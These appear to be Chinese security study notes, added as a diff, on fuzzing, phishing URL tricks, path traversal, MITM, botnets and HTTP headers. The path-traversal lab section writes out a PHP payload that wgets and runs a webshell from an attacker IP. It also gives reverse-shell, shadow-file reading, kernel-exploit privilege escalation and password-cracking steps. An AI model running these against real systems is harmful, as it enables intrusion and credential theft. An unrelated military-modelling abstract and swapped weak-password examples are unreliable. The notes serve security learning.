+- Invalid input：In fuzz testing, fuzzers are used to generate an invalid input which is used for testing error-handling routines, and this is important for the software which does not control its input, Simple fuzzing can be known as a way to automate negative testing
+- Correctness bugs：Fuzzing can also be used to detect some types of correctness bugs, Such as a corrupted database, poor search results, etc
+
+总的来说包括了以上3种类型的bug
+
+- 内存泄漏
+- 非法输入
+- 部分正确的bug
+
+#### <font color="yellow">006 Advantages of Fuzz Testing</font>
+
+- 提升了软件安全性的测试
+- 模糊测试发现的通常是严重的错误，而且是容易被黑客攻击的错误
+- 模糊测试可以发现那些由于时间和资源限制而无法被测试人员发现的错误
+
+#### <font color="yellow">007 Disadvantages of Fuzz Testing</font>
+
+- 仅靠模糊测试无法全面了解整个安全威胁或bug
+- 在处理不会导致程序崩溃的安全威胁时，例如某些病毒、蠕虫、木马等，模糊测试的效率较低
+- 模糊测试只能检测简单的错误或威胁
+- 为了有效地执行，这将需要大量的时间
+- 设置带有随机输入的边值条件是非常有问题的，但是现在使用基于用户输入的确定性算法，大多数测试人员解决了这个问题
+
+#### <font color="yellow">008 总结</font>
+
+在软件工程中，Fuzz测试显示应用程序中存在bug，模糊不能保证在应用程序中完全检测出bug，但是通过使用Fuzz技术，它确保了应用程序的健壮性和安全性，因为这种技术有助于暴露大多数常见的漏洞
+
+### <font color="yellow">02 网络钓鱼</font>
+
+钓鱼攻击使用多种技术，一封电子邮件信息或网页的显示同其运行表现出欺骗性差异
+
+#### <font color="yellow">001 复制图片和网页设计、相似的域名</font>
+
+用户鉴别网站的一种方法是检查地址栏中显示的URL，为了达到欺骗目的，攻击者会注册一个域名，它看起来同要假冒的网站域名相似，有时攻击者还会改变大小写或使用特殊字符，由于大多数浏览器是以无衬线字体显示URL的，因此，`paypaI.com`可用来假冒`paypal.com`，`barcIays.com`可用来假冒`barclays.com`，更常见的是，假域名只简单地将真域名的一部分插入其中，例如，用`ebay-members-security.com`假冒`ebay.com`，用`users-paypal.com`假冒`paypal.com`，而大多数用户缺少判断一个假域名是否真正为被仿冒公司所拥有的工具和知识
+
+#### <font color="yellow">002 URL隐藏</font>
+
+假冒URL的另一种方法利用了URL语法中一种较少用到的特性，用户名和密码可包含在域名前，语法为`:http://username:password@domain/`，攻击者将一个看起来合理的域名放在用户名位置，并将真实的域名隐藏起来或放在地址栏的最后，例如`http://chncto.com/%6C%6C...%6C@211.112.228.2`，网页浏览器的最近更新已关闭了这个漏洞，其方法是在地址栏显示前将URL中的用户名和密码去掉，或者只是简单的完全禁用含用户名/密码的URL语法，Internet Explorer就使用了后一种办法
+
+#### <font color="yellow">003 IP地址</font>
+
+隐藏一台服务器身份的最简单办法就是使它以IP地址的形式显示，如`http://210.93.**.250`，这种技术的有效性令人难以置信，由于许多合法URL也包含一些不透明且不易理解的数字，因此，只有懂得解析URL且足够警觉的用户才有可能产生怀疑
+
+#### <font color="yellow">004 欺骗性的超链接</font>
+
+一个超链接的标题完全独立于它实际指向的URL，攻击者利用这种显示和运行间的内在差异，在链接标题中显示一个URL，而在背后使用了一个完全不同的URL，即便是一个有着丰富知识的用户，他在看到消息中显而易见的URL后也可能不会想到去检查其真实的URL，检查超链接目的地址的标准方法是将鼠标放在超链接上，其URL就会在状态栏中显示出来，但这也可能被攻击者利用JavaScript或URL隐藏技术所更改
+
+#### <font color="yellow">005 隐藏提示</font>
+
+还有一种更复杂的攻击，它不是在URL上做文章，而是通过完全替换地址栏或状态栏达到使其提供欺骗性提示信息的目的，最近发生的一次攻击就使用了用JavaScript在Internet Explorer的地址栏上创建的一个简单的小窗口，它显示的是一个完全无关的URL
+
+#### <font color="yellow">006 弹出窗口</font>
+
+最近对Citibank客户的一次攻击使网页复制技术前进了一步，它在浏览器中显示的是真实的Citibank网页，但在页面上弹出了一个简单的窗口，要求用户输入个人信息
+
+#### <font color="yellow">007 社会工程</font>
+
+钓鱼攻击还使用非技术手段使用户坠入陷阱，其中的一个策略就是急迫性，从而使用户急于采取行动，而较少花时间去核实消息的真实性，另一个策略是威胁用户，如果不按照所要求的去做就会造成可怕的后果，如终止服务或关闭帐户，少数攻击还许诺将获得巨额回报(如，你中了一个大奖!)，但威胁攻击更为常见，用户往往会对不劳而获产生怀疑，这可能是人类的本能
+
+### <font color="yellow">03 路径遍历(目录遍历)</font>
+
+#### <font color="yellow">001 简介</font>
+
+路径遍历攻击也称为目录遍历，旨在，访问存储在web根文件夹之外的文件和目录，通过操纵带有点-斜线(…)序列及其变化的文件或使用绝对路径来引用文件的变量，来访问存储在文件系统上的任意文件和目录，包括应用程序源代码、配置和关键系统文件，需要注意的是，系统访问控制(如在微软Windows操作系统上锁定或使用文件)限制了对文件的访问权限
+
+- 靶机：`192.168.1.113`
+- 攻击机：`192.168.1.110`
+
+owasp-zap web漏洞扫描器，自动挖掘web应用程序中的漏洞，高危漏洞path traversal，打开之后发现一串代码，这是返回etc/passwd/的文件信息，接下来在浏览器中把passswd修改为shadow就可以查看该站点shadow的文件内容，但是发现并没有返回shadow的对应信息，因为服务器设置的shadow是不可用的，修改路径可以得到不同的内容，只要该路径下存在该内容，或者该文件设置的对应权限是可读的
+
+#### <font color="yellow">002 利用目录遍历漏洞获取shell思路</font>
+
+- 上传webshell到服务器
+- 之后通过对应的目录遍历路径访问webshell，执行webshell
+- 在kali linux当中获取反弹shell
+
+dbadmin敏感目录有敏感页面，浏览器访问，使用弱口令尝试登陆，弱口令有字母型和数字型，字母型是用123456作为对应的用户名和密码，数字型是用admin作为用户名和密码，使用admin进行登录可以进入系统后台，在系统后台新建数据库，数据表，字段(写入`<?php system("cd /tmp;wget http://192.168.1.110:8000/webshell.php;chmod +x webshell.php;php webshell");?>`)，创建服务器用于靶场机器下载对应webshell
+
+#### <font color="yellow">003 提权</font>
+
+提权前提：已经拿到低权shell，被入侵机器上有nc,python,perl等工具，有权限上传文件和下载文件
+
+内核溢出漏洞提权，先对系统相关信息收集
+
+查看发行版本
+
+- `cat/etc/issue`
+- `cat/etc/*-release`
+
+查看内核版本
+
+- `uname -a`
+
+寻找内核溢出代码
+
+上传内核溢出代码，编译执行
+
+|searchsploit|发行版本|内核版本|
+|-|-|-|
+|gcc xxx.c|-o|exploit|
+|chmod|+x|exploit|
+
+./exploit
+
+明文root密码提权
+
+大多数Linux系统密码都和`/etc/passwd`和`/etc/shadow`这两个配置文件息息相关，passwd存储了用户，shadow存储了密码的hash，出于安全考虑passwd是全用户可读，root可写，shadow是仅root可读写的
+
+#### <font color="yellow">004 破解用户名和密码</font>
+
+`unshadow passwd shadow > cracked`
+
+`john cracked`
+
+计划任务：计划任务是一些定时执行的任务，由crontab管理，具有所属用户的权限，非root权限用户是不可以列出root用户的计划任务的，但`/etc/`内系统的计划任务可以被列出，默认这些程序由root权限执行，若有幸可将其中脚本配置成任意用户可写的管理员，即可修改脚本连回rootshell，若定时执行的文件是py脚本，可使用脚本来替换之前的脚本，靶场代码之前有写出来过
+
+#### <font color="yellow">005 密码复用</font>
+
+很多管理员会使用相同密码，即数据库或后台密码即是root密码
+
+### <font color="yellow">04 中间人攻击</font>
+
+https协议就是http+ssl协议
+
+- https请求
+
+	客户端向服务端发送https请求
+
+- 生成公钥和私钥
+
+	服务端收到请求之后，生成公钥和私钥，公钥相当于是锁，私钥相当于是钥匙，只有私钥才能够打开公钥锁住的内容
+
+- 返回公钥 
+
+	服务端将公钥(证书)返回给客户端，公钥里面包含有很多信息，比如证书的颁发机构、过期时间等等
+
+- 客户端验证公钥 
+
+	客户端收到公钥之后，首先会验证其是否有效，如颁发机构或者过期时间等，如果发现有问题就会抛出异常，提示证书存在问题，如果没有问题，那么就生成一个随机值，作为客户端的密钥，然后用服务端的公钥加密
+
+- 发送客户端密钥 
+
+	客户端用服务端的公钥加密密钥，然后发送给服务端
+
+- 服务端收取密钥，对称加密内容 
+
+	服务端收到经过加密的密钥，然后用私钥将其解密，得到客户端的密钥，然后服务端把要传输的内容和客户端的密钥进行对称加密，这样除非知道密钥，否则无法知道传输的内容
+
+- 加密传输 
+
+	服务端将经过加密的内容传输给客户端
+
+- 获取加密内容，解密 
+
+	客户端获取加密内容后，用之前生成的密钥对其进行解密，获取到内容
+
+#### <font color="yellow">001 中间人劫持攻击</font>
+
+https也不是绝对安全的，如下图所示为中间人劫持攻击，中间人可以获取到客户端与服务器之间所有的通信内容，中间人截取客户端发送给服务器的请求，然后伪装成客户端与服务器进行通信，将服务器返回给客户端的内容发送给客户端，伪装成服务器与客户端进行通信，通过这样的手段，便可以获取客户端和服务器之间通信的所有内容，使用中间人攻击手段，必须要让客户端信任中间人的证书，如果客户端不信任，则这种攻击手段也无法发挥作用
+
+#### <font color="yellow">002 中间人攻击的预防</font>
+
+造成中间人劫持的原因是没有对服务端证书及域名做校验或者校验不完整，为了方便，直接采用开源框架默认的校验方式进行https请求
+
+#### <font color="yellow">003 对抗方法</font>
+
+- 针对安全性要求比较高的app，可采取客户端预埋证书的方式锁死证书，只有当客户端证书和服务端的证书完全一致的情况下才允许通信，如一些银行类的app，但这种方式面临一个问题，证书过期的问题，因证书有一定的有效期，当预埋证书过期了，只有通过强制更新或者要求用户下载证书来解决
+- 针对安全性要求一般的app，可采用通过校验域名，证书有效性、证书关键信息及证书链的方式
+
+#### <font color="yellow">004 Webview的HTTPS安全</font>
+
+目前很多应用都用webview加载H5页面，如果服务端采用的是可信CA颁发的证书，在`webView.setWebViewClient`(webviewClient)时重载WebViewClient的`onReceivedSslError()`，如果出现证书错误，直接调用`handler.proceed()`会忽略错误继续加载证书有问题的页面，如果调用`handler.cancel()`可以终止加载证书有问题的页面，证书出现问题了，可以提示用户风险，让用户选择加载与否，如果是需要安全级别比较高，可以直接终止页面加载，提示用户网络环境有风险
+
+### <font color="yellow">05 发展僵尸网络</font>
+
+#### <font color="yellow">001 简介</font>
+
+僵尸网络的发展历程概括为5个阶段，分析各阶段特点和代表性僵尸网络，对僵尸网络进行形式化定义并依据命令控制信道拓扑结构将其划分为4类
+
+当前僵尸网络研究热点归纳为
+
+- 检测
+- 追踪
+- 测量
+- 预测
+- 对抗
+
+僵尸网络之所以形成如此严重的威胁，从技术角度来开，主要有以下原因
+
+僵尸网络是从传统蠕虫和木马发展而来的一种新的攻击形式，如从具有利用既有安全漏洞而快速传染扩散的有事，但存在感染大量计算机后不被控制者所控制的缺点，即攻击者无法利用已感染的计算机形成增值网络攻击，甚至因其不可控二无法获知蠕虫扩散熟读、感染规模和地理分布等基本信息
+
+对僵尸网络的研究可归纳为
+
+- 检测(detection)
+- 追踪(tracking)
+- 测量(measurement)
+- 预测(prediction)
+- 对抗(countermeasure)
+
+其中
+
+- 检测的目的是发现新的僵尸网络	
+- 追踪的目的是获知僵尸网络的内部活动
+- 测量的目的是掌握僵尸网络的拓扑结构、活跃规模、完全规模和变化轨迹
+- 预测的目的是考虑未来可能出现的攻击技术并预先研究防御方法
+- 对抗的目的是接管僵尸网络控制权或降低其可用性
+
+##### <font color="yellow">0001 虚拟战争空间模型研究</font>
+
+摘要
+
+> 为了能够更加全面深刻地对现代信息化条件下的战争问题进行描述和分析，提出采用自底向上的综合建模方法，即多Agent建模方法，在计算机上构建能够体现军事作战行动在军事、经济、政治和社会领域综合效应，并考虑全球背景影响的虚拟战争空间模型
+> 
+> 1. 首先阐述了虚拟战争空间的基本概念，给出了虚拟战争空间模型的基本组成与结构
+> 2. 然后讨论了建模需要解决的关键技术问题
+> 3. 最后对该领域研究的工作实践进行了总结
+
+虚拟全球战争空间是对战争系统的一个整体建模，力图通过模拟战争系统状态在战争进程中的演化过程，反映出战争系统在空间、时间上的综合效果，模型从某种意义上看，就是战争的一个平行系统，将战争问题放入这个空间中，通过观察或试验模拟的战争系统，就可以研究战争的一般规律和特殊规律，以达到认识战争的目的
+
+虚拟战争空间模型的基本组成与结构
+
+> 虚拟战争空间从建模思路上是采用的自底向上的Agent建模方法，系统具有涌现性和演化
+> 
+> 虚拟战争空间模型从逻辑上可以分为六层
+> 
+> 1. 最底层为虚拟战争空间模型系统提供大规模计算能力支撑和数据信息服务的计算环境层
+> 2. 上一层是人口特征模型层和关键基础设施网络模型层
+> 3. 三层为微观Agent行为模型层
+> 4. 第四层为PMESI多领域综合模型层
+> 5. 第五层为实验设计与运行管理层
+> 6. 最上层为可视化分析系统，该层主要采用多领域，多角度，多层次可视化方法来展现系统运行的结果，为系统分析人员理解分析系统运行过程与结果提供一个可视化的交互手段
+> 
+> 在虚拟战争空间模型中，PMESI多领域综合模型层为体现其功能特征的关键部分，其基本模型可以划分为两类，一类是军事模型，另一个非军事的社会域模型
+
+建模需要解决的关键技术问题
+
+> 虚拟战争空间模型是一个非常复杂和庞大的计算机仿真模型系统，要构建这样一个系统需要解决的关键问题有很多，根据目前的研究工作实践，归纳起来大致有三个方面的关键问题
+> 
+> - 模型构建问题
+> - 模型集成与仿真控制问题，其中大规模异构Agent模型集成与时空一致性问题最为突出
+> - 超大规模计算能力的支撑问题
+
+虚拟战争空间是一个新的概念，也是一个非常复杂的多领域综合模型系统，其根本目的是为全面深刻的研究和分析现代信息化条件下的战争问题在理论与技术上进行探索，在思考过程和研究实践中，虽然遇到的困惑、困难和问题很多，但是采用复杂系统的建模研究思路，把传统的军事作战仿真扩展到非军事的社会领域，并把它置于全球化背景下进行研究是符合现代战争问题研究分析的发展趋势的，本文通过对一些研究设想和研究工作实践的介绍，希望能够起到抛砖引玉的作用，以引起更多的学者专家对现代战争问题建模仿真方法研究的关注
+
+##### <font color="yellow">0002 新型作战空间建模方针实践与体会</font>
+
+传统的陆战、空战、海战武器平台以及相应的火力、侦察、探测行为模型，无法刻画类似于网络病毒、临近空间飞行器、空天飞机甚至是舆情传播等发生在新型作战空间中的新型作战行动
+
+新型作战空间给建模仿真带来新的挑战
+
+新型作战空间是新生事物且不断发展，认知还有待统一，传统建模方法难以有效解决新型作战空间建模面临的难题
+
+- 传统自然环境建模方法无法体现新型作战空间的信息网络和体系对抗特征
+- 传统物理域建模方法无法描述新型作战空间在信息域和认知域的作战机理
+- 传统火力损耗建模方法无法刻画新型作战空间对体系作战能力的核心作用
+
+重点介绍了网电空间、太空域和社会域，这三类典型新型作战空间建模仿真过程中遇到的突出问题、解决思路和经验成果
+
+> 网电空间
+> 
+> - 网电空间不是传统作战空间的简单延展
+> 	
+>   网电空间依托电磁装备，联网生成，目的是人感和人控，是一个建立在物理空间之上，为认知服务的特殊空间
+> 
+> - 网电空间应重点对虚拟实体和虚拟实体与物理实体的关联，以及对感知、判断、决策等认知行动的影响进行描述
+> 	
+>   网电空间对抗不能等同于体系对抗中一般意义的作战行动
+> 	
+>   网电空间对抗不是简单的作战行动，而是能直接影响体系本身甚至是人的认知的核心作战行动，成为体系对抗的核心
+> 
+> - 网电空间在体系作战能力形成和发挥过程中起核心和基础作用，将网电空间影响的关注点放在反映体系网络化结构基础、网络化交互过程以及网络化级联效应等体系作战能力的整体性问题上
+> 
+> 网电空间战场信息网络建模：我们重点探索了基于网络之网络理论的战场信息网络建模技术，网络之网络的结构特点可归纳为以下三点
+> 
+> - 由多类异质网络组成的更大的网络
+> - 每类网络具有特定任务使命和独立运行规律
+> - 异质网络间存在相互依赖关系，即存在相依点或相依边
+
+#### <font color="yellow">002 僵尸网络</font>
+
+僵尸网络(简称机器人网络)是由感染的计算机网络的恶意软件在一个攻击方的控制之下，被称为僵尸牧民，每个在`bot-herder`控制下的个人机器被称为机器人，从一个中心点来看，攻击方可以命令其僵尸网络上的每台计算机同时执行协调的刑事诉讼，僵尸网络的规模(许多由数百万个僵尸程序组成)使攻击者能够执行以前不可能使用恶意软件的大规模操作，由于僵尸网络仍然受远程攻击者的控制，受感染的计算机可以动态接收更新并更改其行为，因此，僵尸牧民通常能够在黑市上租用他们的僵尸网络段，以获得巨大的经济收益
+
+常见的僵尸网络操作包括
+
+- 电子邮件垃圾邮件
+
+        虽然电子邮件今天被视为攻击的旧版本，但垃圾邮件僵尸网络的规模最大，它们主要用于发送垃圾邮件，通常包括恶意软件，每个僵尸程序的数量都很高，例如，Cutwail僵尸网络每天最多可以发送740亿条消息，它们还用于传播机器人以向僵尸网络招募更多计算机
+
+- DDoS攻击
+
+        利用僵尸网络的大规模来使目标网络或服务器超载请求，使其无法访问目标用户，DDoS攻击针对个人或政治动机或勒索付款以换取停止攻击
+
+- 财务违规
+
+        包括专门为企业资金和信用卡信息直接盗窃而设计的僵尸网络，像ZeuS僵尸网络这样的金融僵尸网络一直负责在很短的时间内直接从多个企业窃取数百万美元的攻击
+
+- 有针对性的入侵
+
+        较小的僵尸网络旨在危害组织的特定高价值系统，攻击者可以从中渗透并进一步侵入网络，这些入侵对组织来说极其危险，因为攻击者专门针对他们最有价值的资产，包括财务数据，研发，知识产权和客户信息
+
+当`bot-herder`使用文件共享，电子邮件或社交媒体应用程序协议或其他机器人作为中介将bot从他的命令和控制服务器发送给不知情的接收者时，创建僵尸网络，一旦收件人在他的计算机上打开恶意文件，机器人就会报告命令并控制`bot-herder`可以向受感染的计算机发出命令的位置
+
+下面是一个说明这些关系的图表
+
+> 机器人和僵尸网络的许多独特功能特性使它们非常适合长期入侵，`bot-herder`可以更新机器人，根据他/她希望他们做的事情来改变他们的整个功能，并适应目标系统的变化和对策，机器人还可以利用僵尸网络上的其他受感染计算机作为通信渠道，为僵尸牧民提供近乎无限数量的通信路径，以适应不断变化的选项并提供更新，这突出表明感染是最重要的一步，因为功能和通信方法总是可以在以后根据需要进行更改，作为最复杂的现代恶意软件之一，僵尸网络是政府，企业和个人的巨大网络安全问题，早期的恶意软件是一群独立的代理，只是简单地感染和复制自己，僵尸网络是集中协调的网络应用程序，利用网络来获得能力和弹性，由于受感染的计算机受远程`bot-herder`的控制，因此僵尸网络就像在网络中拥有恶意黑客，而不仅仅是恶意的可执行程序
+
+僵尸网络已成为当今安全系统面临的最大威胁之一，它们在网络罪犯中越来越受欢迎，原因是它们能够渗透几乎所有联网设备，从DVR播放器到企业服务器，僵尸网络也越来越多地成为网络安全文化讨论的一部分，Facebook的虚假广告争议和Twitter机器人在2016年总统大选期间的惨败，令许多政界人士和公民担心僵尸网络的破坏性潜力，麻省理工学院(MIT)最近发表的研究得出结论，社交媒体机器人和自动账户在传播假新闻方面发挥着重要作用，利用僵尸网络来挖掘比特币等加密货币，是网络犯罪日益猖獗的一项业务，据预测，这一趋势将持续下去，导致更多电脑感染挖掘软件，更多数字钱包被盗，僵尸网络不仅是影响选举和挖掘加密货币的工具，对企业和消费者来说也很危险，因为它们被用来部署恶意软件、发起对网站的攻击、窃取个人信息和欺骗广告商，很明显僵尸网络是有害的，但它们到底是什么呢?如何保护您的个人信息和设备?
+
+- 第一步是了解机器人是如何工作的
+- 第二步是采取预防措施
+
+##### <font color="yellow">0001 僵尸网络(Botnets)</font>
+
+僵尸网络(Botnets)这个名称本身是robot和network两个单词的混合，从广义上讲，僵尸网络一个用来实施网络犯罪的机器人网络，控制它们的网络罪犯被称为僵尸主人或机器人牧人(Botmaster)
+
+###### <font color="yellow">a. 规模很重要</font>
+
+为了建立一个僵尸网络，Botmaster需要尽可能多感染在线设备, 连接的机器人越多，僵尸网络就越大，僵尸网络越大，影响就越大，想象一下，你召集了10个朋友在同一时间给机动车辆管理局打电话，除了震耳欲聋的电话铃声和公务员的匆忙之外，不会发生什么别的事情，现在，想象你召集100个朋友做同样的事情，如此大量的请求同时涌入，将使车管所的电话系统过载，可能会完全关闭，网络罪犯利用僵尸网络在互联网上制造类似的破坏，他们命令受感染的机器人大军使网站超载，使其无法正常运行或访问，这种攻击称为拒绝服务或DDoS
+
+###### <font color="yellow">b. 僵尸网络感染</font>
+
+僵尸网络的创建通常不仅仅是为了攻击一台电脑，它们被设计用来感染数百万台设备，Botmaster经常通过木马病毒在计算机上部署僵尸网络，这通常要求用户通过打开电子邮件附件、点击恶意弹出广告或从网站下载危险软件来感染自己的系统，在感染设备之后，僵尸网络就可以自由访问和修改个人信息，攻击其他计算机，并犯下其他罪行，更复杂的僵尸网络甚至可以自我传播，自动发现和感染设备，这类自主机器人执行寻找并感染任务，不断在网上搜索缺乏操作系统更新或杀毒软件的易受攻击的联网设备，僵尸网络很难被发现，它们只使用少量的计算能力，以避免干扰正常的设备功能和警告用户，更先进的僵尸网络甚至被设计成能更新自己的行为，以阻止网络安全软件的检测
+
+###### <font color="yellow">c. 脆弱的设备</font>
+
+僵尸网络几乎可以感染任何直接或无线连接到互联网的设备，个人电脑、笔记本电脑、移动设备、DVR、智能手表、安全摄像头和智能厨房电器都可能落入僵尸网络，尽管认为冰箱或咖啡机在不知情的情况下参与网络犯罪似乎很荒谬，但这种情况发生的频率比大多数人意识到的要高，通常，设备制造商使用不安全的密码来保护设备的进入，这使得在互联网上搜索的自动机器人很容易找到并利用这些密码，随着物联网(Internet of Things)的不断发展，越来越多的设备联网，网络犯罪分子有了更大的机会来扩大他们的僵尸网络，以及由此带来的影响程度，2016年，美国Dyn公司遭到大规模DDoS攻击，攻击使用了一个由安全摄像头和DVR组成的僵尸网络，DDoS扰乱了美国大部分地区的互联网服务，给Twitter和亚马逊(Amazon)等许多热门网站带来了问题
+
+##### <font color="yellow">0002 僵尸网络攻击</font>
+
+除了DDoS攻击，Botmaster还利用僵尸网络进行其他恶意攻击
+
+###### <font color="yellow">a. 广告欺诈</font>
+
+网络罪犯可以利用僵尸网络的综合处理能力来实施欺诈计划，例如，Botmaster通过命令数千台受感染的设备访问欺诈性网站，并点击放置在那里的广告，从而构建广告欺诈方案，每点击一次，黑客就会获得一定比例的广告费
+
+###### <font color="yellow">b. 出售和租赁僵尸网络</font>
+
+僵尸网络甚至可以在互联网上出售或出租，在感染了数千台设备之后，Botmaster会寻找其他有兴趣利用这些设备传播恶意软件的网络罪犯，僵尸网络买家然后进行网络攻击，散布勒索软件，或窃取个人信息
+
+##### <font color="yellow">0003 僵尸网络结构</font>
+
+僵尸网络结构通常有两种形式，每一种结构都被设计成尽可能多地给予僵尸主机控制
+
+###### <font color="yellow">a. 客户机-服务器模型</font>
+
+客户机-服务器僵尸网络结构类似于一个基本网络，其中有一个主服务器控制来自每个客户机的信息传输，Botmaster使用特殊的软件来建立命令和控制服务器(C&C服务器)，将指令转发给每个客户端设备，虽然客户机-服务器模型在获取和维护对僵尸网络的控制方面工作得很好，但是它有几个缺点：执法人员比较容易定位C&C服务器，而且它只有一个控制点，摧毁服务器，僵尸网络就死机了
+
+###### <font color="yellow">b. 点对点(P2P)</font>
+
+新的P2P僵尸网络不再依赖于一个集中的C&C服务器，而是使用了更加互联的点对点(P2P)结构，在P2P僵尸网络中，每个被感染的设备都扮演着客户端和服务器的角色，每个机器人都有一个其他受感染设备的列表，它们会寻找这些设备进行更新，并在它们之间传输信息，P2P僵尸网络结构使得执法部门更难找到任何集中的源头，缺乏单一的C&C服务器也使得P2P僵尸网络更难被破坏
+
+##### <font color="yellow">0004 僵尸网络的预防</font>
+
+现在已经了解了僵尸网络的工作原理，下面是一些防止僵尸网络的方法
+
+###### <font color="yellow">a. 更新操作系统</font>
+
+预防恶意软件的首要方法之一就是更新你的操作系统，软件开发人员积极打击恶意软件，他们很早就知道威胁何时出现，将操作系统设置为自动更新，并确保运行的是最新版本
+
+###### <font color="yellow">b. 避免来自可疑或未知来源的电子邮件附件</font>
+
+电子邮件附件是许多病毒最喜欢的感染源，不要打开来自未知来源的附件，甚至仔细检查朋友和家人发来的电子邮件，僵尸程序经常使用联系人列表来撰写和发送垃圾邮件和受感染的电子邮件，你朋友发来的邮件实际上可能是伪装的僵尸网络
+
+###### <font color="yellow">c. 避免从P2P和文件共享网络下载</font>
+
+僵尸网络利用P2P网络和文件共享服务来感染计算机，在执行文件之前扫描任何下载文件，或者找到传输文件的更安全的替代方法
+
+###### <font color="yellow">d. 不要点击可疑链接</font>
+
+恶意网站的链接是常见的感染点，所以在没有彻底检查的情况下，避免点击它们，将光标悬停在超文本上，查看URL的实际位置，恶意链接喜欢生活在留言板，YouTube评论，弹出广告，等等
+
+###### <font color="yellow">e. 杀毒软件</font>
+
+杀毒软件是避免和消除僵尸网络的最好方法，寻找设计用于覆盖所有设备而不仅仅是计算机的防病毒保护，僵尸网络渗透到所有类型的设备中，所以要关注范围广泛的软件
+
+### <font color="yellow">06 http报头</font>
+
+HTTP(Hyper Text Transfer Protocol)是超文本传输协议的缩写，它用于传送WWW方式的数据，关于HTTP协议的详细内容请参考`RFC2616`，HTTP协议采用了请求/响应模型，客户端向服务器发送一个请求，请求头包含请求的方法、URI、协议版本、以及包含请求修饰符、客户信息和内容的类似于MIME的消息结构，服务器以一个状态行作为响应，相应的内容包括消息协议的版本，成功或者错误编码加上包含服务器信息、实体元信息以及可能的实体内容，通常HTTP消息包括客户机向服务器的请求消息和服务器向客户机的响应消息，这两种类型的消息由一个起始行，一个或者多个头域，一个只是头域结束的空行和可选的消息体组成，HTTP的头域包括通用头，请求头，响应头和实体头四个部分，每个头域由一个域名，冒号(`:`)和域值三部分组成，域名是大小写无关的，域值前可以添加任何数量的空格符，头域可以被扩展为多行，在每行开始处，使用至少一个空格或制表符
+
+#### <font color="yellow">001 通用头域</font>
+
+通用头域包含请求和响应消息都支持的头域
+
+通用头域包含
+
+- `Cache-Control`
+- `Connection`
+- `Date`
+- `Pragma`
+- `Transfer-Encoding`
+- `Upgrade`
+- `Via`
+
+对通用头域的扩展要求通讯双方都支持此扩展，如果存在不支持的通用头域，一般将会作为实体头域处理
+
+下面简单介绍几个在UPnP消息中使用的通用头域
+
+#### <font color="yellow">002 `Cache-Control`头域</font>
+
+`Cache-Control`指定请求和响应遵循的缓存机制，在请求消息或响应消息中设置Cache-Control并不会修改另一个消息处理过程中的缓存处理过程
+
+请求时的缓存指令包
+
+- `no-cache`
+- `no-store`
+- `max-age`
+- `max-stale`
+- `min-fresh`
+- `only-if-cached`
+
+响应消息中的指令包括
+
+- `public`
+- `private`
+- `no-cache`
+- `no-store`
+- `no-transform`
+- `must-revalidate`
+- `proxy-revalidate`
+- `max-age`
+
+各个消息中的指令含义如下
+
+> `Public`指示响应可被任何缓存区缓存
+> 
+> `Private`指示对于单个用户的整个或部分响应消息，不能被共享缓存处理，这允许服务器仅仅描述当用户的部分响应消息，此响应消息对于其他用户的请求无效
+> 
+> `no-cache`指示请求或响应消息不能缓存
+> 
+> `no-store`用于防止重要的信息被无意的发布，在请求消息中发送将使得请求和响应消息都不使用缓存
+> 
+> `max-age`指示客户机可以接收生存期不大于指定时间(以秒为单位)的响应
+> 
+> `min-fresh`指示客户机可以接收响应时间小于当前时间加上指定时间的响应
+> 
+> `max-stale`指示客户机可以接收超出超时期间的响应消息，如果指定`max-stale`消息的值，那么客户机可以接收超出超时期指定值之内的响应消息
+
+#### <font color="yellow">003 `Date`头域</font>
+
+`Date`头域表示消息发送的时间，时间的描述格式由`rfc822`定义，例如，`Date:Mon,31Dec200104:25:57GMT`，`Date`描述的时间表示世界标准时，换算成本地时间，需要知道用户所在的时区
+
+#### <font color="yellow">004 `Pragma`头域</font>
+
+Pragma头域用来包含实现特定的指令，最常用的是`Pragma:no-cache`，在HTTP/1.1协议中，它的含义和`Cache-Control:no-cache`相同
+
+#### <font color="yellow">005 请求消息</font>
+
+请求消息的第一行为下面的格式
+
+`MethodSPRequest-URISPHTTP-VersionCRLFMethod`表示对于`Request-URI`完成的方法，这个字段是大小写敏感的
+
+包括
+
+- OPTIONS
+- GET
+- HEAD
+- POST
+- PUT
+- DELETE
+- TRACE
+
+方法`GET`和`HEAD`应该被所有的通用WEB服务器支持，其他所有方法的实现是可选的，`GET`方法取回由`Request-URI`标识的信息，`HEAD`方法也是取回由`Request-URI`标识的信息，只是可以在响应时，不返回消息体，`POST`方法可以请求服务器接收包含在请求中的实体信息，可以用于提交表单，向新闻组、BBS、邮件群组和数据库发送消息，`SP`表示空格，`Request-URI`遵循URI格式，在此字段为星号(`*``)时，说明请求并不用于某个特定的资源地址，而是用于服务器本身，`HTTP-Version`表示支持的HTTP版本，例如为HTTP/1.1，`CRLF`表示换行回车符，请求头域允许客户端向服务器传递关于请求或者关于客户机的附加信息
+
+请求头域可能包含下列字段
+
+- `Accept`
+- `Accept-Charset`
+- `Accept-Encoding`
+- `Accept-Language`
+- `Authorization`
+- `From`
+- `Host`
+- `If-Modified-Since`
+- `If-Match`
+- `If-None-Match`
+- `If-Range`
+- `If-Range`
+- `If-Unmodified-Since`
+- `Max-Forwards`
+- `Proxy-Authorization`
+- `Range`
+- `Referer`
+- `User-Agent`
+
+对请求头域的扩展要求通讯双方都支持，如果存在不支持的请求头域，一般将会作为实体头域处理
+
+#### <font color="yellow">006 典型的请求消息</font>
+
+```text
+GET http://download.microtool.de:80/somedata.exe
+Host: download.microtool.de
+Accept:*/*
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://download.microtool.de/
+User-Agent:Mozilla/4.04[en](Win95;I;Nav)
+Range:bytes=554554-
+```
+
+上例第一行表示HTTP客户端(可能是浏览器、下载程序)通过`GET`方法获得指定URL下的文件
+
+#### <font color="yellow">007 `Host`头域</font>
+
+`Host`头域指定请求资源的Intenet主机和端口号，必须表示请求url的原始服务器或网关的位置，HTTP/1.1请求必须包含主机头域，否则系统会以400状态码返回
+
+#### <font color="yellow">008 `Referer`头域</font>
+
+`Referer`头域允许客户端指定请求uri的源资源地址，这可以允许服务器生成回退链表，可用来登陆、优化cache等，他也允许废除的或错误的连接由于维护的目的被追踪，如果请求的uri没有自己的uri地址，`Referer`不能被发送，如果指定的是部分uri地址，则此地址应该是一个相对地址
+
+#### <font color="yellow">009 `Range`头域</font>
+
+`Range`头域可以请求实体的一个或者多个子范围
+
+例如
+
+- 表示头500个字节：`bytes=0-499`
+- 表示第二个500字节：`bytes=500-999`
+- 表示最后500个字节：`bytes=-500`
